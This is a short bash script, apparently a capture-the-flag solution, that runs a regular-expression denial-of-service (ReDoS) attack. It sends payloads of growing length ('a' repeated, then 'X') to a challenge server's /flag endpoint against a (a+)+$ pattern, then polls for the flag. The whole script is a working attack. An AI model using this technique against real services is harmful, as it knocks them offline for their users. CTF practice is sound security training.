#!/bin/bash

echo "ğŸ¤– Fastest Robot ReDoS Exploit"
echo "================================"

# The vulnerable regex: (a+)+$
# Strategy: Create input that causes catastrophic backtracking

echo "Building ReDoS payload..."

# Test different lengths
for length in 22 24 26 28 30; do
    payload=$(python3 -c "print('a' * $length + 'X')")
    echo ""
    echo "Testing length $length: $payload"
    
    echo "Launching ReDoS attack..."
    timeout 30s curl "https://cpp.bootupctf.net:8088/flag/$payload" || echo "Request timed out or completed"
    
    echo "Waiting 2 seconds then checking..."
    sleep 2
    
    # Quick check if flag is accessible
    flag_result=$(timeout 5s curl -s "https://cpp.bootupctf.net:8088/flag" 2>/dev/null)
    if echo "$flag_result" | grep -q "flag"; then
        echo "ğŸ‰ FLAG FOUND!"
        echo "$flag_result"
        exit 0
    fi
    
    echo "No flag yet, trying next length..."
    sleep 1
done

echo "âŒ Exploit unsuccessful with tested payloads"
